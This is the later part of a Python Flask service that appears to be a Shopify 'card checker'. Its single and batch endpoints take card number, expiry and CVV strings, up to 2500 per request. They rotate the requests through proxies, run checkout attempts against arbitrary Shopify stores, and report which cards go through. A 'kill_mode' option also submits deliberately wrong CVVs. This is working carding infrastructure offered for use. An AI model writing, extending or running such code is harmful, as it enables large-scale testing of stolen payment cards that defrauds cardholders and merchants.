            logger.debug("Suppressed exception while closing pooled session: %s", exc, exc_info=True)

    global _global_connector, _global_connector_loop
    connector = _global_connector
    _global_connector = None
    _global_connector_loop = None
    if connector is not None and not connector.closed:
        try:
            await connector.close()
        except Exception as exc:
            logger.debug("Suppressed exception while closing connector: %s", exc, exc_info=True)

    _user_semaphores.clear()
    _user_semaphore_refs.clear()
    _PER_SITE_SEMAPHORES.clear()
    _PER_SITE_SEMAPHORE_REFS.clear()

    global _SESSION_POOL_LOCK, _PER_SITE_LOCK, _semaphore
    _SESSION_POOL_LOCK = None
    _PER_SITE_LOCK = None
    _semaphore = None


def _start_background_loop(loop):
    logger.info("Background loop starting...")
    asyncio.set_event_loop(loop)
    try:
        loop.run_forever()
    finally:
        if not loop.is_closed():
            try:
                loop.run_until_complete(_shutdown_background_resources())
            except Exception as exc:
                logger.debug("Suppressed exception during loop cleanup: %s", exc, exc_info=True)


def stop_background_loop(timeout=10):
    global _loop, _loop_thread
    with _loop_lock:
        loop = _loop
        thread = _loop_thread
        if loop is None or loop.is_closed() or thread is None:
            return
        if threading.current_thread() is thread:
            return

        if thread.is_alive():
            try:
                future = asyncio.run_coroutine_threadsafe(_shutdown_background_resources(), loop)
                future.result(timeout=timeout)
            except Exception as exc:
                logger.debug("Background resource shutdown failed: %s", exc, exc_info=True)
            try:
                loop.call_soon_threadsafe(loop.stop)
            except Exception as exc:
                logger.debug("Unable to stop background loop: %s", exc, exc_info=True)
            thread.join(timeout=timeout)

        if not thread.is_alive() and not loop.is_closed():
            try:
                loop.close()
            except Exception as exc:
                logger.debug("Unable to close background loop: %s", exc, exc_info=True)
            _loop = None
            _loop_thread = None


# التحسين: دالة get_event_loop مع Lock للحماية
def get_event_loop():
    global _loop, _loop_thread
    with _loop_lock:
        loop_alive = (
            _loop is not None
            and not _loop.is_closed()
            and _loop_thread is not None
            and _loop_thread.is_alive()
        )
        if not loop_alive:
            _loop = asyncio.new_event_loop()
            _loop_thread = threading.Thread(
                target=_start_background_loop,
                args=(_loop,),
                daemon=True,
                name="background-asyncio-loop",
            )
            _loop_thread.start()
        return _loop

async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_str, timeout_sec=40, check_only=False, uid=None):
    global _semaphore, _user_semaphores, _user_semaphore_refs, ACTIVE_WORKERS
    if _semaphore is None:
        _semaphore = asyncio.Semaphore(MAX_CONCURRENT)

    safe_uid = str(uid) if uid else "unknown"
    if safe_uid not in _user_semaphores:
        _user_semaphores[safe_uid] = asyncio.Semaphore(500)
        _user_semaphore_refs[safe_uid] = 0
    _user_semaphore_refs[safe_uid] = _user_semaphore_refs.get(safe_uid, 0) + 1

    logger.info(f"[{cc}] Acquired semaphores, waiting...")
    try:
        async with _semaphore:
            async with _user_semaphores[safe_uid]:
                ACTIVE_WORKERS += 1
                try:
                    MAX_OUTER_RETRIES = 2
                    for outer_attempt in range(MAX_OUTER_RETRIES + 1):
                        logger.info(f"[{cc}] Calling process_card (outer attempt {outer_attempt + 1})...")
                        success, message, gateway, price, currency = await process_card(
                            cc, mes, ano, cvv, site_url, variant_id, proxy_str, timeout_sec, check_only=check_only, uid=uid
                        )

                        # التحسين: معالجة PRICE_TOO_HIGH مع مسح الكاش وإعادة المحاولة
                        if (not success and
                                isinstance(message, str) and
                                'PRICE_TOO_HIGH' in message.upper()):
                            if outer_attempt < MAX_OUTER_RETRIES:
                                cache_key = normalize_cache_key(site_url)
                                if cache_key in _VARIANT_CACHE:
                                    del _VARIANT_CACHE[cache_key]
                                logger.info(f"[{cc}] PRICE_TOO_HIGH — clearing cache and retrying "
                                          f"(attempt {outer_attempt + 2}/{MAX_OUTER_RETRIES + 1})...")
                                await asyncio.sleep(0.5)
                                continue
                            else:
                                message = "PRICE_TOO_HIGH"

                        if (not success and
                                isinstance(message, str) and
                                'ORDER_TOTAL_CHANGED' in message.upper()):
                            if outer_attempt < MAX_OUTER_RETRIES:
                                cache_key = normalize_cache_key(site_url)
                                if cache_key in _VARIANT_CACHE:
                                    del _VARIANT_CACHE[cache_key]
                                logger.info(f"[{cc}] ORDER_TOTAL_CHANGED — session expired, retrying full checkout "
                                          f"(attempt {outer_attempt + 2}/{MAX_OUTER_RETRIES + 1})...")
                                await asyncio.sleep(0.5)
                                continue
                            else:
                                message = "DYNAMIC_PRICING_UNSUPPORTED"

                        if (not success and
                                isinstance(message, str) and
                                ('CAPTCHA_REQUIRED' in message.upper() or
                                 any(kw in message for kw in ('Proxy Error:', 'Request Timeout:', 'Proxy Error: Request failed')))):
                            return success, message, gateway, price, currency

                        return success, message, gateway, price, currency
                    return success, message, gateway, price, currency
                finally:
                    ACTIVE_WORKERS -= 1

    finally:

        refs = _user_semaphore_refs.get(safe_uid, 0) - 1
        if refs <= 0:
            _user_semaphore_refs.pop(safe_uid, None)
            _user_semaphores.pop(safe_uid, None)
        else:
            _user_semaphore_refs[safe_uid] = refs

# ═══════════════════════════════════════════════════════════════════
# التحسين: دالة _parse_timeout_value
def _parse_timeout_value(value, default):
    """Parse a request timeout while preserving existing defaults."""
    if value is None or value == "":
        return default
    try:
        parsed = int(value)
    except (TypeError, ValueError):
        return default
    return parsed if parsed > 0 else default


# ──────────────────────── Flask App ─────────────────────────────────

app = Flask(__name__)

# ── Single-card endpoint ──────────────────────────────────────────────
@app.route('/shopify', methods=['GET'])
def shopify_checker():
    try:
        site = request.args.get('site') or request.args.get('url')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        uid = request.args.get('uid')

        if not site:
            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
        if not cc_string:
            return jsonify({"error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV", "status": False}), 400

        try:
            cc_parts = parse_cc_string(cc_string)
            if request.args.get('kill_mode'):
                real_cvv = cc_parts['cvv']
                wrong_cvv = real_cvv
                while wrong_cvv == real_cvv:
                    wrong_cvv = str(random.randint(0, (10**len(real_cvv))-1)).zfill(len(real_cvv))
                cc_parts['cvv'] = wrong_cvv
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400

        variant_id = request.args.get('variant')
        loop = get_event_loop()

        timeout_val = request.args.get('timeout')
        timeout_sec = _parse_timeout_value(timeout_val, 45)

        check_only_val = request.args.get('check_only', '0')
        check_only = check_only_val in ('1', 'true', 'True')

        logger.info(f"[{cc_string}] Submitting to event loop...")
        future_timeout = timeout_sec + 60
        future = asyncio.run_coroutine_threadsafe(
            _throttled_process(
                cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'],
                site, variant_id, proxy_str, timeout_sec, check_only=check_only, uid=uid
            ),
            loop
        )
        logger.info(f"[{cc_string}] Waiting for future (timeout={future_timeout}s)...")
        success, message, gateway, price, currency = future.result(timeout=future_timeout)
        logger.info(f"[{cc_string}] Future completed.")

        return jsonify(_build_result(cc_string, success, message, gateway, price, currency, site))

    except Exception as e:
        logger.error(f"Error in shopify_checker: {e}")
        return jsonify({
            "error": str(e), "status": False,
            "Gateway": "UNKNOWN", "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500

# ── Batch endpoint ────────────────────────────────────────────────────
@app.route('/batch', methods=['POST'])
def batch_checker():
    try:
        data = request.get_json(force=True)
        site = data.get('site', '')
        cards = data.get('cards', [])
        variant_id = data.get('variant')
        uid = data.get('uid')

        proxy_list = data.get('proxies', [])
        single_proxy = data.get('proxy')
        if not proxy_list and single_proxy:
            proxy_list = [single_proxy]

        if not site:
            return jsonify({"error": "Missing 'site' field", "status": False}), 400
        if not cards or not isinstance(cards, list):
            return jsonify({"error": "Missing or invalid 'cards' array", "status": False}), 400
        if len(cards) > 2500:
            return jsonify({"error": f"Max 2500 cards per batch request. Please chunk your lists.", "status": False}), 400

        parsed = []
        for i, cc_string in enumerate(cards):
            proxy_for_card = proxy_list[i % len(proxy_list)] if proxy_list else None
            try:
                parts = parse_cc_string(cc_string.strip())
                if data.get('kill_mode'):
                    real_cvv = parts['cvv']
                    wrong_cvv = real_cvv
                    while wrong_cvv == real_cvv:
                        wrong_cvv = str(random.randint(0, (10**len(real_cvv))-1)).zfill(len(real_cvv))
                    parts['cvv'] = wrong_cvv
                parsed.append((cc_string.strip(), parts, proxy_for_card))
            except ValueError:
                parsed.append((cc_string.strip(), None, proxy_for_card))

        timeout_val = data.get('timeout')
        timeout_sec = _parse_timeout_value(timeout_val, 40)

        loop = get_event_loop()

        async def _run_batch():
            tasks = []
            for cc_string, parts, px in parsed:
                if parts is None:
                    async def _bad(cs=cc_string):
                        return cs, False, "Invalid CC format", "UNKNOWN", "0.00", "USD"
                    tasks.append(_bad())
                else:
                    async def _check(cs=cc_string, p=parts, prx=px):
                        try:
                            success, msg, gw, price, cur = await _throttled_process(
                                p['cc'], p['mes'], p['ano'], p['cvv'],
                                site, variant_id, prx, timeout_sec, uid=uid
                            )
                            return cs, success, msg, gw, price, cur
                        except Exception as ex:
                            return cs, False, str(ex), "UNKNOWN", "0.00", "USD"
                    tasks.append(_check())

            return await asyncio.gather(*tasks)

        future_timeout = max(300, (len(cards) * 3) + timeout_sec + 60)
        future = asyncio.run_coroutine_threadsafe(_run_batch(), loop)
        results = future.result(timeout=future_timeout)

        output = []
        for cc_string, success, message, gateway, price, currency in results:
            output.append(_build_result(cc_string, success, message, gateway, price, currency, site))

        return jsonify(output)

    except Exception as e:
        logger.error(f"Error in batch_checker: {e}")
        return jsonify({"error": str(e), "status": False}), 500

# ── Site-only check endpoint ──────────────────────────────────────────
@app.route('/site_check', methods=['GET'])
def site_check():
    try:
        site = request.args.get('site') or request.args.get('url')
        proxy_str = request.args.get('proxy')
        timeout_val = request.args.get('timeout')
        timeout_sec = _parse_timeout_value(timeout_val, 20)

        if not site:
            return jsonify({"valid": False, "error": "Missing 'site' parameter"}), 400

        ourl = site if site.startswith('http') else f'https://{site}'

        loop = get_event_loop()
        future = asyncio.run_coroutine_threadsafe(
            fetch_products(ourl, proxy_str, timeout_sec),
            loop
        )
        result = future.result(timeout=timeout_sec + 10)

        if isinstance(result, tuple) and result[0] is False:
            return jsonify({
                "valid": False,
                "site": site,
                "error": str(result[1])
            })

        return jsonify({
            "valid": True,
            "site": site,
            "variant_id": result.get('variant_id'),
            "price": result.get('price'),
            "link": result.get('link'),
            "currency": result.get('currency', 'USD'),
            "requires_shipping": result.get('requires_shipping', False)
        })

    except Exception as e:
        logger.error(f"Error in site_check: {e}")
        return jsonify({"valid": False, "site": request.args.get('site', ''), "error": str(e)}), 500

# ── Clear Cache endpoint ──────────────────────────────────────────────
@app.route('/delcache', methods=['GET'])
def clear_cache():
    global _VARIANT_CACHE
    cleared = len(_VARIANT_CACHE)
    _VARIANT_CACHE.clear()
    logger.info(f"Cache cleared: {cleared} items removed")
    return jsonify({"status": "success", "cleared": cleared})

# ── Status endpoint ──────────────────────────────────────────────────
@app.route('/status', methods=['GET'])
def status():
    cached_count = len(_VARIANT_CACHE)
    with _SESSION_POOL_STATE_LOCK:
        pool_stats = {k: len(v) for k, v in _SESSION_POOL.items()}
    pool_total = sum(pool_stats.values())

    sys_stats = {}
    try:
        import psutil, time as _time
        sys_stats["cpu_usage"] = psutil.cpu_percent(interval=None)
        ram = psutil.virtual_memory()
        sys_stats["ram_percent"] = ram.percent
        sys_stats["ram_used_gb"] = round(ram.used / (1024**3), 1)
        sys_stats["ram_total_gb"] = round(ram.total / (1024**3), 1)
        uptime_seconds = _time.time() - psutil.boot_time()
        days, rem = divmod(uptime_seconds, 86400)
        hours, rem = divmod(rem, 3600)
        minutes, _ = divmod(rem, 60)
        sys_stats["uptime_str"] = f"{int(days)}d {int(hours)}h {int(minutes)}m"
    except Exception as e:
        sys_stats["error"] = str(e)

    return jsonify({
        "status": "online",
        "max_concurrent": MAX_CONCURRENT,
        "active_workers": ACTIVE_WORKERS,
        "max_per_site": _get_max_per_site(),
        "variant_cache_size": cached_count,
        "session_pool": pool_stats,
        "session_pool_total_idle": pool_total,
        "system_specs": sys_stats,
        "endpoints": {
            "single":     "GET /shopify?site=...&cc=...&proxy=...",
            "batch":      "POST /batch {site, cards[], proxy}",
            "site_check": "GET /site_check?site=...&proxy=... (pre-warm cache, no CC)",
            "status":     "GET /status"
        }
    })

atexit.register(stop_background_loop)

if __name__ == "__main__":
    logger.info(f"[ENGINE] Max concurrency: {MAX_CONCURRENT} cards")
    logger.info("[ENGINE] Single:     GET /shopify?site=...&cc=...&proxy=...")
    logger.info("[ENGINE] Batch:      POST /batch  {site, cards[], proxy}")
    logger.info("[ENGINE] Site-check: GET /site_check?site=...&proxy=... (pre-warm variant cache)")
    get_event_loop()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
